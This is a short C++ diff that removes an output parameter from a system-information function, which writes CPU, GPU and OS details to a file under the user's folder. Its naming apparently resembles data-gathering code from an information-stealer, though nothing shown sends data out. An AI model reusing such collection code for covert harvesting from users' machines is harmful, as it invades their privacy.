@@ -95,14 +95,13 @@ std::string GetCPUType();
 
 std::string GetWindowsOSType();
 
-void cursystem::GetSysInfo(std::string& sendInfo)
+void cursystem::GetSysInfo()
 {
 	printf("sys info\n");
 
 	std::string mainPath = "C:/Users/" + func::GetUser() + config::path + "/System-Info/System-Info.txt";
 
 	GetGeneralInfo();
-	sendInfo = global::info;
 	CmdSysInfo();
 	CPU();
 	GPU();
